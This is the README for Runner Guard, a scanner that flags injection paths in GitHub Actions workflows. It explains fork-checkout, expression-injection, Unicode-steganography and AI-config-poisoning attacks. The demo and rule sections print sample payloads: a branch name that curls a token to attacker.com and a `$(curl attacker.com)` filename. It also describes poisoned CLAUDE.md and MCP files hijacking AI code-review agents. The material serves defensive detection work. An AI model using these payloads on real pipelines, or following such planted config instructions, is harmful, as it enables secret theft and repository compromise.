# Runner Guard

**CI/CD source-to-sink vulnerability scanner for GitHub Actions**

On March 1, 2026, an autonomous AI agent compromised multiple high-profile open-source projects in under 20 minutes using misconfigured CI/CD pipelines. The agent forked repos, submitted pull requests, and exfiltrated Personal Access Tokens through `pull_request_target` workflows that checked out fork code in privileged contexts. Runner Guard catches the exact vulnerability class that made it possible.

Runner Guard performs source-to-sink vulnerability scanning (also known as static taint analysis) on GitHub Actions workflow files to detect injection paths -- from attacker-controlled inputs (fork code, branch names, issue comments, PR titles) to dangerous sinks (shell execution, secret access, network exfiltration). It detects AI configuration injection attacks across Claude (CLAUDE.md), GitHub Copilot (copilot-instructions.md), Cursor (.cursorrules), and MCP tooling (.mcp.json), and scans for supply chain steganography including the GlassWorm campaign's invisible Unicode payload technique and known IOCs.

---

## The Attacks Explained

### CI/CD Pipeline Injection

GitHub Actions workflows triggered by `pull_request_target` run in the context of the base (target) repository, not the fork. This means they have access to repository secrets, write-scoped GITHUB_TOKEN, and all configured permissions. The trigger exists so maintainers can run trusted operations (labeling, commenting) on incoming PRs. The critical mistake is combining this privileged trigger with `actions/checkout` pointing at the pull request's head -- the fork code. When a workflow does this, every file in the attacker's fork executes with the base repository's full credentials.

The attack chain is straightforward: an attacker forks the target repository, modifies build scripts, test configurations, Makefiles, or package manager hooks to include malicious commands (secret exfiltration, backdoor injection, release tampering), then opens a pull request. The `pull_request_target` workflow checks out the fork code and runs the build. The malicious commands execute with write access to the repository and all its secrets. In documented incidents, attackers exfiltrated Personal Access Tokens to external servers, then used them to push malicious commits directly to main branches -- all within minutes, fully automated by AI agents. The same pattern applies to `issue_comment` triggers where branch names or comment bodies are interpolated into shell commands without sanitization.

### Supply Chain Steganography

In March 2026, the GlassWorm campaign compromised 433+ components across GitHub, npm, and VS Code/OpenVSX using a technique that is invisible to code review: Unicode steganography. Attackers injected invisible characters -- variation selectors, zero-width spaces, tag characters -- into source files. These characters are completely hidden in code editors, terminals, and GitHub's diff viewer, but encode executable payloads that activate during CI/CD pipeline runs.

The decoded ZOMBI module performed credential harvesting, cryptocurrency wallet theft, SOCKS proxy deployment, and used the Solana blockchain for command-and-control. The attack targeted files that CI pipelines trust implicitly: `setup.py`, `package.json`, build scripts, and workflow YAML itself. Because the malicious payload is invisible, standard code review and even `git diff` cannot detect it -- only byte-level scanning reveals the hidden characters.

Runner Guard detects this attack class at the byte level: invisible Unicode in workflow files (RGS-016), in referenced scripts executed by workflows (RGS-017), and known IOC patterns and eval+decode payload techniques in run blocks (RGS-018). Threat signatures are loaded from updatable YAML files in the `rules/signatures/` directory, organized by campaign, so new indicators can be added without code changes.

### Active Supply Chain Campaign (March 2026)

In March 2026, a coordinated supply chain attack campaign escalated through multiple phases, targeting increasingly critical open source infrastructure:

- **Phase 1-2 (March 12)**: reviewdog and tj-actions/changed-files GitHub Actions compromised, harvesting CI/CD credentials from 23,000+ repositories
- **Phase 3 (March 19-27)**: Aqua Security Trivy vulnerability scanner, Checkmarx KICS/AST GitHub Actions, BerriAI LiteLLM AI gateway (97M monthly downloads), and Telnyx Python SDK all compromised by threat actor TeamPCP. Cisco lost 300+ source code repositories as a direct result.
- **Phase 4 (March 30)**: Axios HTTP client (100M weekly downloads) compromised with a cross-platform Remote Access Trojan. Attributed to North Korean threat actor UNC1069 by Google Threat Intelligence Group.

Runner Guard includes IOC signatures for all confirmed phases of this campaign: TeamPCP C2 domains and behavioral patterns, UNC1069/Axios RAT indicators, and Telnyx steganography techniques. Signatures are organized in `rules/signatures/` with one file per campaign for easy browsing and contribution.

---

## How It Works

Runner Guard uses a four-stage analysis pipeline:

1. **Parser** -- Reads GitHub Actions workflow YAML files and builds a structured representation of triggers, permissions, jobs, steps, expressions, and action references. Handles matrix strategies, reusable workflows, composite actions, and tolerates real-world YAML edge cases (under-indented block scalars, embedded control characters, mixed line endings) that strict parsers reject.

2. **Source-to-Sink Tracker** -- Identifies attacker-controlled sources (`github.event.pull_request.head.sha`, `github.head_ref`, `github.event.comment.body`, `github.event.pull_request.title`, fork-checked-out file paths) and traces them through expression interpolations, environment variables, step outputs, and file artifacts to dangerous sinks (shell `run:` blocks, action `with:` inputs, network calls).

3. **Rule Engine** -- Evaluates 18 detection rules (RGS-001 through RGS-019) against the parsed workflow and source-to-sink graph. Each rule defines source patterns, sink patterns, required context conditions (trigger type, permissions, checkout target), and severity. Rules are defined in YAML for easy extension. Threat signatures (31 IOC patterns across 5 campaigns) are loaded from the `rules/signatures/` directory, organized by threat actor for easy browsing and contribution.

4. **Reporter** -- Outputs findings in multiple formats: human-readable console output with color and context, JSON for programmatic consumption, and SARIF for integration with GitHub Code Scanning, VS Code, and other SARIF-compatible tools.

---

## Features

- **18 detection rules** covering fork checkout exploits, expression injection, secret exfiltration, unpinned actions, AI config injection, and supply chain steganography with permissions-aware severity (read-only jobs get reduced severity for unpinned action findings)
- **31 threat signatures across 5 campaigns** -- GlassWorm, TeamPCP (Trivy/Checkmarx/LiteLLM), UNC1069/Axios, Telnyx, and general supply chain IOCs organized in `rules/signatures/` by threat actor
- **Batch scanning** -- scan multiple repos from a file or stdin with `--repos`, parallel scanning with `--concurrency`, output as console summary table, JSON, or CSV
- **Runner Guard Score** -- CI/CD security score (0-100) with letter grade and category breakdown (Pinning, Permissions, Injection, Triggers, IOCs) displayed after every scan
- **Interactive CLI menu** -- run `runner-guard` with no arguments for a guided experience; power users use flags directly
- **GlassWorm supply chain attack detection** -- Unicode steganography scanning, known IOC matching, and eval+decode payload pattern detection
- **AI config injection detection** across Claude, GitHub Copilot, Cursor, and MCP tooling -- the first scanner to cover this attack surface
- **Source-to-sink vulnerability scanning** tracing attacker-controlled inputs through expressions, environment variables, and step outputs to dangerous sinks
- **SARIF output** for native GitHub Code Scanning integration -- findings appear in the Security tab
- **GitHub Action** -- drop-in workflow to scan every pull request in 10 lines of YAML
- **Remote scanning** -- scan any public GitHub repo by URL without cloning
- **Baseline management** -- suppress known findings and surface only new vulnerabilities
- **Auto-fix** -- pin unpinned third-party actions to immutable commit SHAs, extract unsafe expressions from `run:` blocks into `env:` mappings with shell-aware syntax (bash, PowerShell, cmd)
- **Inline suppression** -- silence individual findings with `# runner-guard:ignore` comments
- **Single binary** -- zero dependencies, all rules embedded, runs anywhere Go compiles

---

## Demo Scenarios

Runner Guard ships with built-in demo scenarios that demonstrate each attack class against realistic vulnerable workflows.

### Fork Checkout Kill Chain

![Fork Checkout Demo](docs/demo-fork-checkout.gif)

The most common CI/CD pipeline attack: a `pull_request_target` workflow checks out fork code in the privileged base repository context, giving an attacker's build scripts full access to repository secrets. Detects the checkout itself (RGS-001), secret exposure to fork code (RGS-007), unpinned actions vulnerable to tag hijacking (RGS-009), and network exfiltration of secrets (RGS-012).

```bash
runner-guard demo --scenario fork-checkout
```

### Expression Injection (Microsoft/Akri Pattern)

![Expression Injection Demo](docs/demo-microsoft.gif)

Modeled after the real-world vulnerability in Microsoft's Akri project. An `issue_comment` trigger interpolates attacker-controlled data -- branch names, comment bodies -- directly into shell `run:` blocks without sanitization. An attacker sets a branch name like `x"; curl attacker.com/steal?t=$TOKEN #` and the shell executes it. Detects branch name injection (RGS-002), missing authorization checks (RGS-004), curl-pipe-bash patterns (RGS-006), and secrets in CLI arguments (RGS-008).

```bash
runner-guard demo --scenario microsoft
```

### AI Configuration Injection

![AI Config Injection Demo](docs/demo-ai-injection.gif)

A novel attack surface unique to Runner Guard's detection capabilities. When a `pull_request_target` workflow checks out fork code, an attacker can modify AI agent configuration files -- CLAUDE.md, copilot-instructions.md, .cursorrules, .mcp.json -- to inject malicious instructions into AI code review agents running in privileged CI contexts. Detects AI config injection (RGS-010) and MCP config hijacking (RGS-011).

```bash
runner-guard demo --scenario ai-injection
```

### GlassWorm Supply Chain Attack

![GlassWorm Detection Demo](docs/glassworm-demo.gif)

Demonstrates detection of the GlassWorm campaign's invisible Unicode steganography technique. The demo workflow contains embedded invisible characters, known malware IOC variables, and dangerous eval+decode patterns -- all techniques used to compromise 433+ components across GitHub, npm, and VS Code/OpenVSX. Detects invisible Unicode in workflow files (RGS-016), known GlassWorm IOCs, and suspicious eval+decode payload patterns (RGS-018).

```bash
runner-guard demo --scenario glassworm
```

---

## Install

**One-liner (macOS/Linux):**

```bash
curl -sSfL https://raw.githubusercontent.com/Vigilant-LLC/runner-guard/main/install.sh | bash
```

**Homebrew (macOS/Linux):**

```bash
brew install Vigilant-LLC/tap/runner-guard
```

**From source:**

```bash
go install github.com/Vigilant-LLC/runner-guard/cmd/runner-guard@latest
```

**Download binaries:**

Pre-built binaries for Linux, macOS, and Windows (amd64/arm64) are available on the [Releases page](https://github.com/Vigilant-LLC/runner-guard/releases).

---

## Usage

![Runner Guard Scan](docs/scan-clean.gif)

### Scan workflows

**Important:** When given a directory, Runner Guard first looks for `.github/workflows/` and scans all YAML files there. If that directory doesn't exist, it **recursively scans all `.yml`/`.yaml` files** under the given path. Always point it at a specific repository root or workflows directory -- never at `/`, `~`, or other broad system paths.

```bash
# Scan all workflows in current repo (looks for .github/workflows/)
runner-guard scan .

# Scan a specific workflows directory
runner-guard scan path/to/.github/workflows/

# Scan a single file
runner-guard scan .github/workflows/ci.yml

# Run only steganography/supply-chain rules
runner-guard scan . --group steganography

# Run only specific rules
runner-guard scan . --rules RGS-016,RGS-018

# Combine groups and rules (union)
runner-guard scan . --group ai-config --rules RGS-001

# Output as SARIF for GitHub Code Scanning
runner-guard scan . --format sarif --output results.sarif

# Output as JSON
runner-guard scan . --format json

# Fail on high severity or above (for CI gates)
runner-guard scan . --fail-on high
```

**Rule groups:** `injection`, `permissions`, `secrets`, `supply-chain`, `ai-config`, `steganography`, `debug`

### Batch scan multiple repos

```bash
# Scan repos from a file (one per line, # for comments)
runner-guard scan --repos repos.txt

# Read repos from stdin
cat repos.txt | runner-guard scan --repos -
echo "github.com/owner/repo" | runner-guard scan --repos -

# Control concurrency (default: 5)
runner-guard scan --repos repos.txt --concurrency 10

# Output as JSON or CSV
runner-guard scan --repos repos.txt --format json
runner-guard scan --repos repos.txt --format csv --output results.csv

# Fail if any repo has high or above
runner-guard scan --repos repos.txt --fail-on high
```

Example `repos.txt`:
```
# Our dependencies
github.com/axios/axios
github.com/expressjs/express

# Local repos
/path/to/local/repo
```

Output includes a summary leaderboard with Runner Guard Score per repo, severity breakdown, and per-repo findings detail.

### Auto-fix workflows

```bash
# Pin all unpinned third-party actions and extract unsafe expressions to env mappings
runner-guard fix .

# Dry run -- show what would be fixed without modifying files
runner-guard fix . --dry-run
```

The fix engine:
- **Pins actions** to immutable commit SHAs with version comments for readability
- **Extracts Tier-1 expressions** (`github.head_ref`, `github.event.pull_request.title`, `github.event.inputs.*`, etc.) from `run:` blocks into `env:` mappings
- **Extracts secrets** (`secrets.*`, `github.token`) from `run:` blocks into `env:` mappings
- **Shell-aware syntax** -- uses `${VAR}` for bash, `$env:VAR` for PowerShell, `%VAR%` for cmd
- **Handles single-quoted contexts** -- GitHub Actions expands `${{ }}` before the shell runs, so single quotes don't protect against injection. The engine uses bash string concatenation to safely extract from single-quoted strings.
- **Skips brace expansions** -- `{1..${{ expr }}}` patterns are left alone since brace expansion happens before variable expansion in bash

### Run demo scenarios

```bash
# Run all demo scenarios with annotated output
runner-guard demo

# Run a specific scenario
runner-guard demo --scenario fork-checkout
runner-guard demo --scenario microsoft
runner-guard demo --scenario ai-injection
runner-guard demo --scenario glassworm

# List available scenarios
runner-guard demo --list
```

### Baseline management

```bash
# Generate a baseline from current findings (suppress known issues)
runner-guard baseline create

# Scan showing only new findings not in baseline
runner-guard scan . --baseline .runner-guard-baseline.json

# Update baseline after triaging new findings
runner-guard baseline update
```

---

## What It Detects

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| RGS-001 | pull_request_target with Fork Code Checkout | Critical | Workflow checks out fork code in privileged base repo context with secret access |
| RGS-002 | Expression Injection via Untrusted Input | Critical | Attacker-controlled input (branch name, PR title, comment body) interpolated directly in shell `run:` block |
| RGS-003 | Dynamic Command Construction from Step Outputs | High | Step outputs combined with git diff/find/ls commands to construct shell commands dynamically |
| RGS-004 | Privileged Trigger with Secrets and No Author Check | High | `issue_comment` or similar trigger with secrets access and no `author_association` or membership verification |
| RGS-005 | Excessive Permissions on Untrusted Trigger | Medium | Write permissions granted on workflows triggered by external users |
| RGS-006 | Dangerous Sink in Run Block | High | Remote script fetched and piped directly to shell interpreter (curl pipe bash) |
| RGS-007 | Unpinned Third-Party Action | Medium/Low | Action referenced by mutable tag instead of immutable commit SHA. Severity downgrades to low when the job has read-only permissions. |
| RGS-008 | Secrets Exposure in Run Block | Medium | Secret or token interpolated directly in `run:` block instead of passed via `env:` mapping |
| RGS-009 | Fork Code Execution via Build Tools | Critical | Build tools (make, npm, pip, cargo) execute attacker-controlled code from fork checkout |
| RGS-010 | AI Agent Config Poisoning via Fork PR | High | CLAUDE.md or similar AI config loaded from fork-controlled checkout |
| RGS-011 | MCP Config Injection via Fork Checkout | High | .mcp.json or MCP config file read from fork-controlled checkout |
| RGS-012 | External Network Access with Secrets Context | Medium | Outbound HTTP request with secret data in privileged workflow context |
| RGS-014 | Expression Injection via workflow_dispatch Input | High | `workflow_dispatch` input interpolated directly in shell `run:` block |
| RGS-015 | Actions Runner Debug Logging Enabled | Medium | `ACTIONS_RUNNER_DEBUG` or `ACTIONS_STEP_DEBUG` enabled, exposing secrets in logs |
| RGS-016 | Unicode Steganography in Workflow File | Critical | Invisible Unicode characters detected in workflow YAML -- active compromise indicator |
| RGS-017 | Unicode Steganography in Referenced Script | High | Invisible Unicode in files executed by the workflow (setup.py, package.json, etc.) |
| RGS-018 | Suspicious Payload Execution Pattern | High | Eval+decode chains, known malware IOCs, or C2 patterns in workflow `run:` blocks |
| RGS-019 | Step Output Interpolated in run Block | Medium | `steps.*.outputs.*` expression interpolated directly in `run:` block -- may carry attacker-controlled data via PR filenames or user input |

**RGS-010** and **RGS-011** are unique to Runner Guard. No other CI/CD security scanner detects AI configuration injection attacks where an attacker modifies CLAUDE.md, .claude/settings.json, .mcp.json, or mcp-config.json in a fork pull request to hijack AI code review agents running in privileged CI contexts.

**RGS-019** detects step outputs (`${{ steps.*.outputs.* }}`) interpolated directly in `run:` blocks. Step outputs may carry attacker-controlled data -- for example, a step that runs `git diff --name-only` on a pull request produces filenames that an attacker controls. When those filenames flow through `$GITHUB_OUTPUT` into a step output and are interpolated directly into a shell script, an attacker can craft filenames like `$(curl attacker.com)` to achieve command injection. This rule flags all step output interpolations for manual review, as not all step outputs are dangerous -- the risk depends on what the producing step does.

**RGS-016**, **RGS-017**, and **RGS-018** detect the GlassWorm supply chain attack and related steganographic techniques. RGS-016 performs byte-level scanning of workflow files for invisible Unicode characters (variation selectors, zero-width chars, tag characters) used to encode hidden payloads. RGS-017 extends this analysis to files referenced and executed by workflows (setup.py, package.json, Dockerfiles, shell scripts). RGS-018 matches known IOC patterns from the GlassWorm campaign and detects dangerous eval+decode execution patterns. Threat signatures are loaded from an embedded `signatures.yaml` that can be updated without code changes.

---

## GitHub Action

Add Runner Guard to your repository as a GitHub Action to automatically scan workflow changes on every pull request:

```yaml
name: Runner Guard Security Scan
on:
  pull_request:
    paths:
      - '.github/workflows/**'
      - 'CLAUDE.md'
      - '.claude/**'
      - '.mcp.json'
permissions:
  contents: read
  security-events: write
jobs:
  runner-guard:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: Vigilant-LLC/runner-guard@c9c54b94d557cfecfc2331b4594d07c07fdbbc0d # v2.7.0
        with:
          fail-on: high
          sarif-upload: 'true'
```

Findings appear directly in the GitHub Security tab under Code Scanning alerts.

To make the scan a required check that blocks PRs with vulnerabilities, enable branch protection: **Settings → Branches → Add rule → Require status checks** and select the `runner-guard` job.

---

## Contributing

Runner Guard welcomes contributions, especially new detection rules. To add a rule:

1. Create a YAML rule file in `rules/` following the existing format (see `rules/RGS-001-prt-fork-checkout.yaml` for reference).
2. Add detection logic in `internal/rules/` if the rule requires new source or sink patterns.
3. Add a test case in `internal/taint/` with a sample vulnerable workflow. (The `taint` package name is an industry-standard term used internally.)
4. Add a demo workflow in `demo/vulnerable/workflows/` if the rule covers a distinct attack scenario.
5. Submit a pull request with a description of the real-world attack pattern the rule detects.

To add threat signatures (IOC patterns for RGS-018) without writing Go code, edit `rules/signatures.yaml` and rebuild. Each signature needs an ID, regex pattern, threat actor name, and severity.

Please also report false positives. Accuracy is critical for a security tool -- a scanner that cries wolf gets disabled.

---

## About Vigilant

[Vigilant](https://vigilantdefense.com) is a cybersecurity company with 16 years of experience standing between organizations and the threats that want to destroy them. We don't believe in passive defense -- we operate with a warfare mindset, hunting threats before they become breaches.

We built Runner Guard because we've weaponized these exact attack chains against banks, government agencies, and critical infrastructure in red team engagements. We know what these vulnerabilities look like from both sides of the wire. When autonomous AI agents started exploiting them at scale, we built the scanner we wished existed.

Our approach is built on three pillars:

- **Forensically Validated Detection & Response (FVDR)** -- our proprietary methodology that treats every detection as evidence, not just an alert. We don't just find threats. We prove them, document them, and guarantee they're closed.

- **[ThreatCert](https://vigilantdefense.com)**, our attack surface intelligence platform. Where Runner Guard detects known pipeline injection patterns, ThreatCert maps your full external attack surface, models complete kill chains, and produces audit-ready evidence packages that satisfy regulators and boards, not just security teams.

- **[CyberDNA](https://vigilantdefense.com)**, our analysis workspace and the home of Vigilant's zero-breach guarantee. Where our analysts correlate pipeline findings, supply chain risk, and external exposure into a single forensic picture of your environment, and stand behind the outcome.

Vigilant donates 25% of profit to organizations combating human trafficking and supporting orphan care worldwide.

For enterprise support, custom rule development, or security assessments, visit [vigilantdefense.com](https://vigilantdefense.com).

---

## Disclaimer

Runner Guard is provided as-is with no warranty. Use at your own risk. This tool identifies potential vulnerabilities but does not guarantee complete coverage. It is not a substitute for a professional security assessment.

---

## License

AGPL-3.0. See [LICENSE](LICENSE) for the full text.

Copyright 2026 Vigilant.
